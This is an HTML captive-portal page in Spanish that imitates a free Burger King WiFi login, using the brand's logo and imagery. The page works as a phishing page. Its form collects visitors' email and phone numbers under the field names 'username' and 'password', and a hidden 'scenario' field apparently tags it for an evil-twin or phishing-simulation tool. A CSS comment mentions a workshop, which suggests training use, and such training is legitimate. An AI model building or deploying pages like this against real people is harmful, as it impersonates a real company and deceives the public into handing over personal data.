<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Burger King® WiFi Gratis</title>
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="https://www.burgerking.es/images/favicon.png">
    
    <style>
        /* =========================================
           Burger King Brand Variables
           ========================================= */
        :root {
            --bk-red: #D62300;
            --bk-orange: #FF8732;
            --bk-brown: #502314;
            --bk-beige: #F8E8C9; /* "Eggshell" / "Cream" background */
            --bk-green: #407900;
            --bk-white: #FFFFFF;
            --font-family-primary: 'Flame Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            --font-family-bold: 'Flame Bold', 'Arial Black', sans-serif;
        }

        /* Fallback Fonts / Web Fonts simulation */
        @font-face {
            font-family: 'Flame Bold';
            src: local('Arial Black'); /* Simplification for workshop */
        }
        @font-face {
            font-family: 'Flame Sans';
            src: local('Helvetica'), local('Arial');
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: var(--font-family-primary);
            background-color: var(--bk-beige);
            color: var(--bk-brown);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* =========================================
           Header
           ========================================= */
        header {
            background-color: var(--bk-beige);
            padding: 15px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            position: relative;
            z-index: 10;
        }

        .logo {
            width: 60px;
            height: auto;
        }

        /* =========================================
           Main Content
           ========================================= */
        main {
            flex: 1;
            padding: 20px 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 500px;
            margin: 0 auto;
            width: 100%;
        }

        /* Hero Image - Whopper or Promo */
        .hero-image {
            width: 100%;
            max-width: 320px;
            height: auto;
            margin-bottom: 24px;
            border-radius: 8px;
            transform: rotate(-2deg); /* BK style playful tilt */
        }

        h1 {
            font-family: var(--font-family-bold);
            color: var(--bk-brown);
            font-size: 32px;
            text-align: center;
            line-height: 1.1;
            margin-bottom: 12px;
            text-transform: uppercase;
        }

        p.subtitle {
            font-size: 16px;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.4;
            font-weight: 600;
        }

        /* Form Container */
        .login-box {
            background: var(--bk-white);
            border-radius: 12px;
            padding: 30px 24px;
            width: 100%;
            box-shadow: 0 8px 0 rgba(80, 35, 20, 0.1); /* Hard shadow style */
            border: 2px solid var(--bk-brown);
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-family: var(--font-family-bold);
            font-size: 14px;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        input[type="email"], 
        input[type="text"] {
            width: 100%;
            padding: 14px;
            border: 2px solid var(--bk-brown);
            border-radius: 8px;
            font-size: 16px;
            background-color: var(--bk-beige);
            color: var(--bk-brown);
            font-family: var(--font-family-primary);
            outline: none;
            transition: all 0.2s;
        }

        input[type="email"]:focus, 
        input[type="text"]:focus {
            background-color: var(--bk-white);
             box-shadow: 0 0 0 4px rgba(214, 35, 0, 0.2);
        }

        /* Custom Checkbox */
        .checkbox-container {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 24px;
            font-size: 13px;
            line-height: 1.4;
        }
        
        input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: var(--bk-red);
            margin-top: 2px;
        }

        /* Button */
        .btn-connect {
            width: 100%;
            padding: 16px;
            background-color: var(--bk-red);
            color: var(--bk-beige); /* Light text on red button */
            border: none;
            border-radius: 30px; /* Pill shape */
            font-family: var(--font-family-bold);
            font-size: 18px;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 4px 0 #9E1900; /* Darker red shadow for depth */
            transition: transform 0.1s, box-shadow 0.1s;
        }

        .btn-connect:active {
            transform: translateY(4px);
            box-shadow: 0 0 0 #9E1900;
        }

        /* Footer */
        footer {
            margin-top: auto;
            padding: 30px 20px;
            text-align: center;
            font-size: 12px;
            color: #8c766f;
        }

        footer a {
            color: var(--bk-brown);
            text-decoration: underline;
        }
        
        /* Loading Spinner Overlay (Hidden by default) */
        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(248, 232, 201, 0.9);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 100;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 6px solid var(--bk-orange);
            border-top: 6px solid var(--bk-red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <header>
        <!-- Logo Real de Burger King (Wikimedia Commons) -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/Burger_King_2020.svg" alt="Burger King Logo" class="logo">
    </header>

    <main>
        <!-- Image placeholder -->
        <img src="https://burgerking.com.cy/sites/default/files/Whopper-01_1.png" alt="Whopper" class="hero-image">

        <h1>Wifi GRATIS</h1>
        <p class="subtitle">Conéctate para disfrutar de tu Whopper® sin gastar datos</p>

        <div class="login-box">
            <form action="/wifi-login" method="POST" id="wifi-form">
                <!-- Se inyecta un campo oculto para saber que vienen del wifi -->
                <input type="hidden" name="scenario" value="burger_king_wifi">

                <div class="form-group">
                    <label for="email">Correo Electrónico</label>
                    <input type="email" id="email" name="username" placeholder="tucorreo@ejemplo.com" required>
                </div>

                <div class="form-group">
                    <label for="phone">Teléfono (Opcional)</label>
                    <input type="text" id="phone" name="password" placeholder="600 000 000">
                </div>

                <div class="checkbox-container">
                    <input type="checkbox" id="terms" required checked>
                    <label for="terms" style="font-size:12px; text-transform:none; margin:0; font-family:var(--font-family-primary);">
                        Acepto los <a href="#" style="color:var(--bk-red); font-weight:bold;">Términos y Condiciones</a> y deseo recibir promociones exclusivas de Burger King® para comer rico y barato.
                    </label>
                </div>

                <button type="submit" class="btn-connect">CONECTARME AHORA</button>
            </form>
        </div>
    </main>

    <footer>
        <p>Burger King® 2026. Todos los derechos reservados.</p>
        <p style="margin-top:10px;">Esta red Wi-Fi es gratuita y de acceso público.</p>
    </footer>

    <!-- Loading Overlay -->
    <div class="overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <h2 style="color:var(--bk-brown); font-family:var(--font-family-bold);">CONECTANDO...</h2>
        <p>Por favor espera un momento</p>
    </div>

    <script>
        document.getElementById('wifi-form').addEventListener('submit', function(e) {
            // Show simulation loading
            // Let the form submit normally after a slight delay if you want, 
            // but for 'action' support, we usually just let it go.
            // Here we show the spinner immediately on submit interaction.
            document.querySelector('.overlay').style.display = 'flex';
        });
    </script>

</body>
</html>
